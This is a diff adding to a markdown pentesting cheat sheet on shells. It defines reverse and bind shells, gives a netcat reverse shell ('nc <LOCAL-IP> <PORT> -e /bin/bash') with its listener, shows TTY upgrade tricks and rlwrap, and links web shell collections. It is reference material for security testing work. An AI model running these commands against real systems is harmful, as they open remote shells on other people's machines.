@@ -1,12 +1,37 @@
+# Shell
+
+**Reverse shells** are when the target is forced to execute code that connects back to your computer.
+
+**Bind shells** are when the code executed on the target is used to start a listener attached to a shell directly on the target.
+
+## Reverse Shell example:
+
+On the attacking machine:
+```
+sudo nc -lvnp 443
+```
+
+On the target:
+```
+nc <LOCAL-IP> <PORT> -e /bin/bash
+```
+
 ## Spawning a Shell
 
 
-## Spawning a TTY Shell
+### Spawning a TTY Shell
 ```
 python -c 'import pty; pty.spawn("/bin/sh")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 export TERM=xterm
+
+CTRL+Z; stty raw -echo; fg
+```
+
+### rlwrap
+```
+rlwrap nc -lvnp <port>
 
 CTRL+Z; stty raw -echo; fg
 ```
@@ -50,11 +75,11 @@ exec "/bin/sh"
 
 
 ## Web Shell
-[phpbash](https://github.com/Arrexel/phpbash)
+[Arrexel phpbash](https://github.com/Arrexel/phpbash)
 
 ```
 /usr/share/webshells
 ```
 
-[webshells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
+[Daniel Miessler webshells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
 
